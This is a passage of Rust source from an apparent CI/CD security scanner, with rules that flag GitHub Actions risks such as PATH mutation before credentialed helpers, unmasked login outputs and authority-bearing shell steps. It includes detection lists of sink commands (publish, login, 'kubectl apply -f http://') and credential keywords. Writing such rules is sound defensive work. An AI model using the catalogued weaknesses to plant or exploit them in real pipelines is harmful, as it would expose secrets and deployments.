        .copied()
        .find(|p| p.action == action)?;
    if profile.requires_skip_install && !gha_with_truthy(step, "skip_install") {
        return None;
    }
    Some(profile)
}

fn gha_with_value<'a>(step: &'a Node, key: &str) -> Option<&'a str> {
    let wanted = key.to_ascii_lowercase();
    let inputs = step.metadata.get(META_GHA_WITH_INPUTS)?;
    inputs.lines().find_map(|line| {
        let (k, v) = line.split_once('=')?;
        if k.eq_ignore_ascii_case(&wanted) {
            Some(v)
        } else {
            None
        }
    })
}

fn gha_with_truthy(step: &Node, key: &str) -> bool {
    gha_with_value(step, key)
        .map(|v| matches!(v.trim().to_ascii_lowercase().as_str(), "true" | "yes" | "1"))
        .unwrap_or(false)
}

fn gha_with_false(step: &Node, key: &str) -> bool {
    gha_with_value(step, key)
        .map(|v| matches!(v.trim().to_ascii_lowercase().as_str(), "false" | "no" | "0"))
        .unwrap_or(false)
}

fn step_has_sensitive_authority(graph: &AuthorityGraph, step_id: NodeId) -> bool {
    graph.edges_from(step_id).any(|e| {
        e.kind == EdgeKind::HasAccessTo
            && graph
                .node(e.to)
                .map(|n| match n.kind {
                    NodeKind::Secret => true,
                    NodeKind::Identity => {
                        n.metadata
                            .get(META_OIDC)
                            .map(|v| v == "true")
                            .unwrap_or(false)
                            || n.name != "GITHUB_TOKEN"
                    }
                    _ => false,
                })
                .unwrap_or(false)
    })
}

fn prior_github_path_writer<'a>(graph: &'a AuthorityGraph, step: &Node) -> Option<&'a Node> {
    let job = step.metadata.get(META_JOB_NAME)?;
    let mut found = None;
    for candidate in graph
        .nodes_of_kind(NodeKind::Step)
        .filter(|candidate| candidate.id < step.id)
        .filter(|candidate| candidate.metadata.get(META_JOB_NAME) == Some(job))
        .filter(|candidate| {
            candidate
                .metadata
                .get(META_SCRIPT_BODY)
                .map(|body| body.contains("GITHUB_PATH"))
                .unwrap_or(false)
        })
    {
        found = Some(candidate);
    }
    found
}

fn later_github_env_writer<'a>(graph: &'a AuthorityGraph, step: &Node) -> Option<&'a Node> {
    let job = step.metadata.get(META_JOB_NAME)?;
    graph
        .nodes_of_kind(NodeKind::Step)
        .filter(|candidate| candidate.id > step.id)
        .filter(|candidate| candidate.metadata.get(META_JOB_NAME) == Some(job))
        .find(|candidate| {
            candidate
                .metadata
                .get(META_SCRIPT_BODY)
                .map(|body| body.contains("GITHUB_ENV"))
                .unwrap_or(false)
        })
}

fn helper_authority_nodes(graph: &AuthorityGraph, writer: NodeId, step: NodeId) -> Vec<NodeId> {
    let mut nodes = vec![writer, step];
    let authority_ids: Vec<NodeId> = graph
        .edges_from(step)
        .filter(|e| e.kind == EdgeKind::HasAccessTo)
        .filter_map(|e| graph.node(e.to).map(|n| n.id))
        .collect();
    for id in authority_ids {
        if !nodes.contains(&id) {
            nodes.push(id);
        }
    }
    nodes
}

fn gha_helper_sensitive_findings(
    graph: &AuthorityGraph,
    mode: &str,
    category: FindingCategory,
    predicate: impl Fn(GhaHelperProfile) -> bool,
) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(profile) = gha_helper_profile(step) else {
            continue;
        };
        if profile.toolcache_absolute || !predicate(profile) {
            continue;
        }
        let Some(writer) = prior_github_path_writer(graph, step) else {
            continue;
        };
        let has_sensitive = step_has_sensitive_authority(graph, step.id) || profile.minted;
        if !has_sensitive {
            continue;
        }
        findings.push(Finding {
            severity: Severity::High,
            category,
            path: None,
            nodes_involved: helper_authority_nodes(graph, writer.id, step.id),
            message: format!(
                "Earlier step '{}' mutates GITHUB_PATH before '{}' runs {} via PATH and passes sensitive authority through {mode}",
                writer.name, step.name, profile.helper
            ),
            recommendation: Recommendation::Manual {
                action: format!(
                    "Resolve `{}` to a trusted absolute path before secrets are materialized, reject helpers under workspace/temp paths, or split the PATH-mutating step into a separate job.",
                    profile.helper
                ),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn gha_helper_path_sensitive_argv(graph: &AuthorityGraph) -> Vec<Finding> {
    gha_helper_sensitive_findings(
        graph,
        "argv",
        FindingCategory::GhaHelperPathSensitiveArgv,
        |profile| profile.argv,
    )
}

pub fn gha_helper_path_sensitive_stdin(graph: &AuthorityGraph) -> Vec<Finding> {
    gha_helper_sensitive_findings(
        graph,
        "stdin",
        FindingCategory::GhaHelperPathSensitiveStdin,
        |profile| profile.stdin,
    )
}

pub fn gha_helper_path_sensitive_env(graph: &AuthorityGraph) -> Vec<Finding> {
    gha_helper_sensitive_findings(
        graph,
        "environment variables",
        FindingCategory::GhaHelperPathSensitiveEnv,
        |profile| profile.env,
    )
}

pub fn gha_helper_untrusted_path_resolution(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(profile) = gha_helper_profile(step) else {
            continue;
        };
        if profile.toolcache_absolute || !profile.path_resolved_helper {
            continue;
        }
        let Some(writer) = prior_github_path_writer(graph, step) else {
            continue;
        };
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaHelperUntrustedPathResolution,
            path: None,
            nodes_involved: vec![writer.id, step.id],
            message: format!(
                "Earlier step '{}' mutates GITHUB_PATH before '{}' resolves security-sensitive helper `{}` by name",
                writer.name, step.name, profile.helper
            ),
            recommendation: Recommendation::Manual {
                action: format!(
                    "Pin `{}` to an action-owned or runner-toolcache absolute path before invoking it with credentials.",
                    profile.helper
                ),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn gha_action_minted_secret_to_helper(graph: &AuthorityGraph) -> Vec<Finding> {
    gha_helper_sensitive_findings(
        graph,
        "minted credential handoff",
        FindingCategory::GhaActionMintedSecretToHelper,
        |profile| profile.minted,
    )
}

pub fn gha_post_ambient_env_cleanup_path(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(profile) = gha_helper_profile(step) else {
            continue;
        };
        if !profile.cleanup_env {
            continue;
        }
        let Some(writer) = later_github_env_writer(graph, step) else {
            continue;
        };
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaPostAmbientEnvCleanupPath,
            path: None,
            nodes_involved: vec![step.id, writer.id],
            message: format!(
                "Action '{}' has post-cleanup state that can be influenced by later GITHUB_ENV writer '{}'",
                step.name, writer.name
            ),
            recommendation: Recommendation::Manual {
                action: "Store cleanup paths in GITHUB_STATE/core.saveState and ignore ambient env values during post cleanup; keep later env mutation in a separate job when possible.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn gha_secret_output_after_helper_login(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(profile) = gha_helper_profile(step) else {
            continue;
        };
        if !profile.output_after_login || !gha_with_false(step, "mask-password") {
            continue;
        }
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::GhaSecretOutputAfterHelperLogin,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Login action '{}' exposes helper login credential material as outputs because `mask-password` is false",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Keep password masking enabled and avoid forwarding login credentials through step/job outputs; prefer scoped credentials consumed only by the login step.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn later_secret_materialized_after_path_mutation(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(profile) = gha_helper_profile(step) else {
            continue;
        };
        if profile.toolcache_absolute || !profile.path_resolved_helper {
            continue;
        }
        let Some(writer) = prior_github_path_writer(graph, step) else {
            continue;
        };
        let has_sensitive = step_has_sensitive_authority(graph, step.id) || profile.minted;
        if !has_sensitive {
            continue;
        }
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::LaterSecretMaterializedAfterPathMutation,
            path: None,
            nodes_involved: helper_authority_nodes(graph, writer.id, step.id),
            message: format!(
                "Earlier step '{}' mutates GITHUB_PATH before later action '{}' materializes authority and resolves helper `{}` through PATH",
                writer.name, step.name, profile.helper
            ),
            recommendation: Recommendation::Manual {
                action: "Treat this as an authority-edge lead: resolve helpers to trusted absolute paths before credentials are materialized, or split mutable PATH setup into an authority-free job.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

fn gha_action_is(step: &Node, action: &str) -> bool {
    gha_action_name(step).as_deref() == Some(action)
}

fn gha_with_nonempty(step: &Node, key: &str) -> bool {
    gha_with_value(step, key)
        .map(|v| {
            let value = v.trim().to_ascii_lowercase();
            !value.is_empty() && !matches!(value.as_str(), "false" | "no" | "0")
        })
        .unwrap_or(false)
}

fn gha_cache_input_is(step: &Node, values: &[&str]) -> bool {
    gha_with_value(step, "cache")
        .map(|v| {
            let value = v.trim().to_ascii_lowercase();
            values.iter().any(|wanted| value == *wanted)
        })
        .unwrap_or(false)
}

fn step_job(step: &Node) -> Option<&str> {
    step.metadata.get(META_JOB_NAME).map(String::as_str)
}

fn same_job_steps_before<'a>(
    graph: &'a AuthorityGraph,
    step: &'a Node,
) -> impl Iterator<Item = &'a Node> {
    let job = step_job(step);
    graph
        .nodes_of_kind(NodeKind::Step)
        .filter(move |candidate| candidate.id < step.id)
        .filter(move |candidate| step_job(candidate) == job)
}

fn same_job_steps_after<'a>(
    graph: &'a AuthorityGraph,
    step: &'a Node,
) -> impl Iterator<Item = &'a Node> {
    let job = step_job(step);
    graph
        .nodes_of_kind(NodeKind::Step)
        .filter(move |candidate| candidate.id > step.id)
        .filter(move |candidate| step_job(candidate) == job)
}

fn job_has_sensitive_authority(graph: &AuthorityGraph, step: &Node) -> bool {
    let Some(job) = step_job(step) else {
        return step_has_sensitive_authority(graph, step.id);
    };
    graph
        .nodes_of_kind(NodeKind::Step)
        .filter(|candidate| step_job(candidate) == Some(job))
        .any(|candidate| step_has_sensitive_authority(graph, candidate.id))
}

pub fn gha_setup_node_cache_helper_path_handoff(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        if !gha_action_is(step, "actions/setup-node") {
            continue;
        }
        let cache_enabled =
            gha_with_nonempty(step, "cache") || gha_with_truthy(step, "package-manager-cache");
        if !cache_enabled {
            continue;
        }
        let Some(writer) = prior_github_path_writer(graph, step) else {
            continue;
        };
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaSetupNodeCacheHelperPathHandoff,
            path: None,
            nodes_involved: vec![writer.id, step.id],
            message: format!(
                "Earlier step '{}' mutates GITHUB_PATH before actions/setup-node cache discovery invokes package-manager helpers through PATH",
                writer.name
            ),
            recommendation: Recommendation::Manual {
                action: "Run setup-node cache discovery before mutable PATH setup, disable package-manager cache discovery, or pin npm/pnpm/yarn helper resolution to trusted toolcache paths.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn gha_setup_python_cache_helper_path_handoff(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        if !gha_action_is(step, "actions/setup-python") {
            continue;
        }
        if !gha_cache_input_is(step, &["pip", "poetry"]) {
            continue;
        }
        let Some(writer) = prior_github_path_writer(graph, step) else {
            continue;
        };
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaSetupPythonCacheHelperPathHandoff,
            path: None,
            nodes_involved: vec![writer.id, step.id],
            message: format!(
                "Earlier step '{}' mutates GITHUB_PATH before actions/setup-python cache discovery invokes pip/poetry helpers through PATH",
                writer.name
            ),
            recommendation: Recommendation::Manual {
                action: "Run Python cache discovery before mutable PATH setup, or use a cache mode that does not resolve package-manager helpers from mutable PATH.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn gha_setup_python_pip_install_authority_env(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        if !gha_action_is(step, "actions/setup-python") || !gha_with_nonempty(step, "pip-install") {
            continue;
        }
        if !job_has_sensitive_authority(graph, step) {
            continue;
        }
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaSetupPythonPipInstallAuthorityEnv,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "actions/setup-python step '{}' uses pip-install mode while the job has token, package-index, cloud, or identity authority in scope",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Prefer a dedicated install step with explicit environment allowlist and trusted Python/pip paths; keep private index and cloud credentials out of ambient env during setup-python install mode.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

fn script_contains_any(body: &str, needles: &[&str]) -> bool {
    let lower = body.to_ascii_lowercase();
    needles.iter().any(|needle| lower.contains(needle))
}

fn step_script_contains_any(step: &Node, needles: &[&str]) -> bool {
    step.metadata
        .get(META_SCRIPT_BODY)
        .map(|body| script_contains_any(body, needles))
        .unwrap_or(false)
}

pub fn gha_docker_setup_qemu_privileged_docker_helper(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        if !gha_action_is(step, "docker/setup-qemu-action") {
            continue;
        }
        let prior_docker_auth = same_job_steps_before(graph, step).any(|candidate| {
            gha_action_is(candidate, "docker/login-action")
                || step_script_contains_any(candidate, &["docker login"])
        });
        let private_image_mode = gha_with_value(step, "image")
            .map(|v| {
                let image = v.trim().to_ascii_lowercase();
                !image.is_empty() && !image.starts_with("tonistiigi/binfmt")
            })
            .unwrap_or(false);
        if !(prior_docker_auth || private_image_mode) {
            continue;
        }
        let Some(writer) = prior_github_path_writer(graph, step) else {
            continue;
        };
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::GhaDockerSetupQemuPrivilegedDockerHelper,
            path: None,
            nodes_involved: vec![writer.id, step.id],
            message: format!(
                "Earlier step '{}' mutates GITHUB_PATH before docker/setup-qemu-action runs privileged Docker helper operations after registry auth or with a private image",
                writer.name
            ),
            recommendation: Recommendation::Manual {
                action: "Run QEMU setup before registry login/private image pulls, resolve Docker through a trusted absolute path, and keep privileged Docker helper execution out of mutable PATH contexts.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

fn is_tool_installer_action(step: &Node) -> Option<&'static str> {
    let action = gha_action_name(step)?;
    match action.as_str() {
        "azure/setup-helm" => Some("helm"),
        "azure/setup-kubectl" => Some("kubectl"),
        "sigstore/cosign-installer" => Some("cosign"),
        _ => None,
    }
}

pub fn gha_tool_installer_then_shell_helper_authority(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for installer in graph.nodes_of_kind(NodeKind::Step) {
        let Some(helper) = is_tool_installer_action(installer) else {
            continue;
        };
        let Some(shell) = same_job_steps_after(graph, installer).find(|candidate| match helper {
            "helm" => step_script_contains_any(
                candidate,
                &[
                    "helm registry login",
                    "helm push",
                    "helm upgrade",
                    "helm install",
                ],
            ),
            "kubectl" => step_script_contains_any(
                candidate,
                &[
                    "kubectl apply",
                    "kubectl create secret",
                    "kubectl rollout",
                    "kubectl set image",
                ],
            ),
            "cosign" => step_script_contains_any(candidate, &["cosign sign", "cosign attest"]),
            _ => false,
        }) else {
            continue;
        };
        if !job_has_sensitive_authority(graph, shell) {
            continue;
        }
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaToolInstallerThenShellHelperAuthority,
            path: None,
            nodes_involved: vec![installer.id, shell.id],
            message: format!(
                "Installer step '{}' prepares `{helper}` and later shell step '{}' uses it while deploy, signing, cloud, or token authority is in scope",
                installer.name, shell.name
            ),
            recommendation: Recommendation::Manual {
                action: format!(
                    "Treat this as a workflow-shell authority lead: call `{helper}` through the installer-owned absolute path when possible and avoid mutable PATH setup between install and privileged use."
                ),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn gha_workflow_shell_authority_concentration(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    const SHELL_SINKS: &[&str] = &[
        "docker login",
        "docker push",
        "docker buildx build --push",
        "npm publish",
        "pnpm publish",
        "yarn npm publish",
        "twine upload",
        "maturin publish",
        "terraform apply",
        "terraform output",
        "helm registry login",
        "helm push",
        "kubectl apply -f http://",
        "kubectl apply -f https://",
        "cosign sign",
        "cosign attest",
        "gh release create",
        "gh release edit",
        "gh release upload",
        "cargo publish",
    ];
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(body) = step.metadata.get(META_SCRIPT_BODY) else {
            continue;
        };
        let matched: Vec<&str> = SHELL_SINKS
            .iter()
            .copied()
            .filter(|sink| script_contains_any(body, &[*sink]))
            .collect();
        if matched.is_empty() || !job_has_sensitive_authority(graph, step) {
            continue;
        }
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhaWorkflowShellAuthorityConcentration,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Workflow shell step '{}' runs authority-bearing sink(s) [{}] while token, cloud, registry, package, or signing authority is in scope",
                step.name,
                matched.join(", ")
            ),
            recommendation: Recommendation::Manual {
                action: "Classify this as workflow hardening unless source or witness evidence identifies an action-owned boundary. Keep publish/deploy/sign/release helpers on trusted paths and use explicit env allowlists around the sink step.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

pub fn run_all_rules(graph: &AuthorityGraph, max_hops: usize) -> Vec<Finding> {
    let mut findings = Vec::new();
    // MVP rules
    findings.extend(authority_propagation(graph, max_hops));
    findings.extend(over_privileged_identity(graph));
    findings.extend(oidc_identity_in_untrusted_context(graph));
    findings.extend(unpinned_action(graph));
    findings.extend(action_major_version_pin_without_sha(graph));
    findings.extend(known_compromised_action_ref(graph));
    findings.extend(untrusted_with_authority(graph));
    findings.extend(artifact_boundary_crossing(graph));
    // Stretch rules
    findings.extend(long_lived_credential(graph));
    findings.extend(floating_image(graph));
    findings.extend(persisted_credential(graph));
    findings.extend(trigger_context_mismatch(graph));
    findings.extend(cross_workflow_authority_chain(graph));
    findings.extend(authority_cycle(graph));
    findings.extend(uplift_without_attestation(graph));
    findings.extend(self_mutating_pipeline(graph));
    findings.extend(checkout_self_pr_exposure(graph));
    findings.extend(variable_group_in_pr_job(graph));
    findings.extend(self_hosted_pool_pr_hijack(graph));
    findings.extend(shared_self_hosted_pool_no_isolation(graph));
    findings.extend(service_connection_scope_mismatch(graph));
    findings.extend(template_extends_unpinned_branch(graph));
    findings.extend(template_repo_ref_is_feature_branch(graph));
    findings.extend(vm_remote_exec_via_pipeline_secret(graph));
    findings.extend(short_lived_sas_in_command_line(graph));
    // ADO inline-script secret-leak rules
    findings.extend(secret_to_inline_script_env_export(graph));
    findings.extend(secret_materialised_to_workspace_file(graph));
    findings.extend(keyvault_secret_to_plaintext(graph));
    findings.extend(setvariable_issecret_false(graph));
    findings.extend(terraform_auto_approve_in_prod(graph));
    findings.extend(addspn_with_inline_script(graph));
    findings.extend(parameter_interpolation_into_shell(graph));
    // GHA red-team-derived rules
    findings.extend(runtime_script_fetched_from_floating_url(graph));
    findings.extend(docker_socket_exposed_to_ci_step(graph));
    findings.extend(privileged_container_in_ci_step(graph));
    findings.extend(pr_trigger_with_floating_action_ref(graph));
    findings.extend(check_homoglyph_in_action_ref(graph));
    findings.extend(untrusted_api_response_to_env_sink(graph));
    findings.extend(pr_build_pushes_image_with_floating_credentials(graph));
    findings.extend(secret_via_env_gate_to_untrusted_consumer(graph));
    // GHA helper-authority rules from Algol authority-confusion research
    findings.extend(gha_helper_path_sensitive_argv(graph));
    findings.extend(gha_helper_path_sensitive_stdin(graph));
    findings.extend(gha_helper_path_sensitive_env(graph));
    findings.extend(gha_post_ambient_env_cleanup_path(graph));
    findings.extend(gha_action_minted_secret_to_helper(graph));
    findings.extend(gha_helper_untrusted_path_resolution(graph));
    findings.extend(gha_secret_output_after_helper_login(graph));
    findings.extend(later_secret_materialized_after_path_mutation(graph));
    findings.extend(gha_setup_node_cache_helper_path_handoff(graph));
    findings.extend(gha_setup_python_cache_helper_path_handoff(graph));
    findings.extend(gha_setup_python_pip_install_authority_env(graph));
    findings.extend(gha_docker_setup_qemu_privileged_docker_helper(graph));
    findings.extend(gha_tool_installer_then_shell_helper_authority(graph));
    findings.extend(gha_workflow_shell_authority_concentration(graph));
    // Blue-team positive invariants (negative-space rules — fire on absence
    // of expected defenses)
    findings.extend(no_workflow_level_permissions_block(graph));
    findings.extend(prod_deploy_job_no_environment_gate(graph));
    findings.extend(long_lived_secret_without_oidc_recommendation(graph));
    findings.extend(pull_request_workflow_inconsistent_fork_check(graph));
    findings.extend(gitlab_deploy_job_missing_protected_branch_only(graph));
    findings.extend(terraform_output_via_setvariable_shell_expansion(graph));
    // GHA council Bucket 1 rules
    findings.extend(risky_trigger_with_authority(graph));
    findings.extend(sensitive_value_in_job_output(graph));
    findings.extend(manual_dispatch_input_to_url_or_command(graph));
    // GHA council Bucket 2 rules
    findings.extend(secrets_inherit_overscoped_passthrough(graph));
    findings.extend(unsafe_pr_artifact_in_workflow_run_consumer(graph));
    // GHA council Bucket 3 rules
    findings.extend(script_injection_via_untrusted_context(graph));
    findings.extend(interactive_debug_action_in_authority_workflow(graph));
    findings.extend(pr_specific_cache_key_in_default_branch_consumer(graph));
    findings.extend(gh_cli_with_default_token_escalating(graph));
    // GitLab council Bucket A rules
    findings.extend(ci_job_token_to_external_api(graph));
    findings.extend(id_token_audience_overscoped(graph));
    findings.extend(untrusted_ci_var_in_shell_interpolation(graph));
    // GitLab council Bucket B+C rules
    findings.extend(unpinned_include_remote_or_branch_ref(graph));
    findings.extend(dind_service_grants_host_authority(graph));
    findings.extend(security_job_silently_skipped(graph));
    findings.extend(child_pipeline_trigger_inherits_authority(graph));
    findings.extend(cache_key_crosses_trust_boundary(graph));
    // GitLab red-team Group D rules
    findings.extend(pat_embedded_in_git_remote_url(graph));
    findings.extend(ci_token_triggers_downstream_with_variable_passthrough(
        graph,
    ));
    findings.extend(dotenv_artifact_flows_to_privileged_deployment(graph));

    // Deduplicate structurally identical findings BEFORE compensating controls.
    // Order matters: compensating controls append to finding messages (e.g.
    // " [compensating control: ...]"), so deduping after them would fail to
    // collapse two BFS-duplicate findings where one CC-modified and the other
    // did not. Key on (category, nodes_involved, message) so distinct
    // per-variable findings on the same step are preserved.
    let mut seen_keys: std::collections::HashSet<(FindingCategory, Vec<NodeId>, String)> =
        std::collections::HashSet::new();
    findings
        .retain(|f| seen_keys.insert((f.category, f.nodes_involved.clone(), f.message.clone())));

    // Blue-team compensating-control suppressions (downgrade or suppress
    // existing-rule findings when a control elsewhere in the graph
    // neutralises the risk). Applied after dedup so each unique finding
    // gets exactly one CC evaluation.
    apply_compensating_controls(graph, &mut findings);
    enrich_publication_context(graph, &mut findings);

    findings.sort_by_key(|f| f.severity);

    findings
}

fn enrich_publication_context(graph: &AuthorityGraph, findings: &mut [Finding]) {
    for finding in findings {
        if finding.extras.confidence_scope.is_none() {
            finding.extras.confidence_scope = Some("yaml_only".to_string());
        }

        finding.extras.portal_control_dependency |= portal_dependency_for(graph, finding);

        let mut authority = std::collections::BTreeSet::<String>::new();
        for kind in authority_kinds_for_nodes(graph, finding) {
            authority.insert(kind);
        }
        finding.extras.authority_kinds = authority.into_iter().collect();

        let mut surfaces = attacker_surface_kinds_for(finding);
        if !matches!(finding.category, FindingCategory::OverPrivilegedIdentity) {
            for node_id in &finding.nodes_involved {
                if let Some(node) = graph.node(*node_id) {
                    if node.kind == NodeKind::Step {
                        if node.trust_zone == TrustZone::Untrusted {
                            surfaces.insert("untrusted_step".to_string());
                        }
                        if node.metadata.contains_key(META_CHECKOUT_SELF) {
                            surfaces.insert("untrusted_checkout".to_string());
                        }
                        if node.metadata.contains_key(META_SELF_HOSTED) {
                            surfaces.insert("self_hosted_runner".to_string());
                        }
                        if node.metadata.contains_key(META_SCRIPT_BODY) {
                            surfaces.insert("script_sink".to_string());
                        }
                    }
                }
            }
        }
        finding.extras.attacker_surface_kinds = surfaces.into_iter().collect();

        if finding.extras.template_resolution_strength.is_none() {
            finding.extras.template_resolution_strength =
                template_resolution_strength_for(graph, finding);
        }

        if finding.extras.cve_relationship.is_none() {
            finding.extras.cve_relationship = cve_relationship_for(finding).map(str::to_string);
        }

        let mut preconditions = std::collections::BTreeSet::<String>::new();
        for p in runtime_preconditions_for(graph, finding) {
            preconditions.insert(p.to_string());
        }
        for existing in finding.extras.runtime_preconditions.drain(..) {
            preconditions.insert(existing);
        }
        finding.extras.runtime_preconditions = preconditions.into_iter().collect();
    }
}

fn portal_dependency_for(graph: &AuthorityGraph, finding: &Finding) -> bool {
    let platform = graph
        .metadata
        .get(META_PLATFORM)
        .map(String::as_str)
        .unwrap_or_default();
    matches!(platform, "ado" | "azure-devops")
        || matches!(
            finding.category,
            FindingCategory::ServiceConnectionScopeMismatch
                | FindingCategory::VariableGroupInPrJob
                | FindingCategory::ProdDeployJobNoEnvironmentGate
                | FindingCategory::TerraformAutoApproveInProd
                | FindingCategory::AddSpnWithInlineScript
                | FindingCategory::RiskyTriggerWithAuthority
                | FindingCategory::NoWorkflowLevelPermissionsBlock
                | FindingCategory::PullRequestWorkflowInconsistentForkCheck
        )
}

fn authority_kinds_for_nodes(graph: &AuthorityGraph, finding: &Finding) -> Vec<String> {
    let mut out = std::collections::BTreeSet::<String>::new();
    for node_id in &finding.nodes_involved {
        if let Some(node) = graph.node(*node_id) {
            match node.kind {
                NodeKind::Secret => {
                    if node.metadata.contains_key(META_VARIABLE_GROUP)
                        || node.name.to_ascii_lowercase().contains("variable group")
                    {
                        out.insert("variable_group".into());
                    } else if is_credential_named(&node.name) {
                        out.insert("credential_named_variable".into());
                    } else {
                        out.insert("secret".into());
                    }
                }
                NodeKind::Identity => {
                    let lower = node.name.to_ascii_lowercase();
                    if node.metadata.contains_key(META_SERVICE_CONNECTION)
                        || node.metadata.contains_key(META_SERVICE_CONNECTION_NAME)
                    {
                        out.insert("service_connection".into());
                    } else if node.metadata.contains_key(META_OIDC) || lower.contains("oidc") {
                        out.insert("oidc_identity".into());
                    } else if lower.contains("github_token")
                        || lower.contains("system.accesstoken")
                        || lower.contains("ci_job_token")
                    {
                        out.insert("job_token".into());
                    } else if node.metadata.contains_key(META_IMPLICIT) {
                        out.insert("implicit_identity".into());
                    } else {
                        out.insert("identity".into());
                    }
                }
                NodeKind::Artifact | NodeKind::Image | NodeKind::Step => {}
            }
        }
    }
    if out.is_empty() && matches!(finding.category, FindingCategory::OverPrivilegedIdentity) {
        out.insert("identity".into());
    }
    out.into_iter().collect()
}

fn is_credential_named(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [
        "token",
        "secret",
        "password",
        "passwd",
        "pat",
        "private_key",
        "access_key",
        "api_key",
        "credential",
        "client_secret",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn attacker_surface_kinds_for(finding: &Finding) -> std::collections::BTreeSet<String> {
    let mut out = std::collections::BTreeSet::<String>::new();
    match finding.category {
        FindingCategory::CheckoutSelfPrExposure => {
            out.insert("untrusted_checkout".into());
        }
        FindingCategory::ScriptInjectionViaUntrustedContext
        | FindingCategory::ManualDispatchInputToUrlOrCommand
        | FindingCategory::ParameterInterpolationIntoShell
        | FindingCategory::UntrustedCiVarInShellInterpolation
        | FindingCategory::SetvariableIssecretFalse
        | FindingCategory::TerraformOutputViaSetvariableShellExpansion
        | FindingCategory::GhaToolInstallerThenShellHelperAuthority
        | FindingCategory::GhaWorkflowShellAuthorityConcentration => {
            out.insert("script_sink".into());
        }
        FindingCategory::UnpinnedAction
        | FindingCategory::PrTriggerWithFloatingActionRef
        | FindingCategory::UnpinnedIncludeRemoteOrBranchRef
        | FindingCategory::FloatingImage
        | FindingCategory::TemplateExtendsUnpinnedBranch
        | FindingCategory::TemplateRepoRefIsFeatureBranch => {
            out.insert("mutable_dependency_ref".into());
        }
        FindingCategory::CrossWorkflowAuthorityChain
        | FindingCategory::SecretsInheritOverscopedPassthrough
        | FindingCategory::ChildPipelineTriggerInheritsAuthority => {
            out.insert("reusable_workflow_boundary".into());
        }
        FindingCategory::RuntimeScriptFetchedFromFloatingUrl => {
            out.insert("remote_script".into());
        }
        FindingCategory::DindServiceGrantsHostAuthority
            if finding_message_rule_id_is(finding, "docker_socket_exposed_to_ci_step") =>
        {
            out.insert("docker_socket".into());
        }
        FindingCategory::DindServiceGrantsHostAuthority
            if finding_message_rule_id_is(finding, "privileged_container_in_ci_step") =>
        {
            out.insert("privileged_container".into());
        }
        FindingCategory::SelfHostedPoolPrHijack
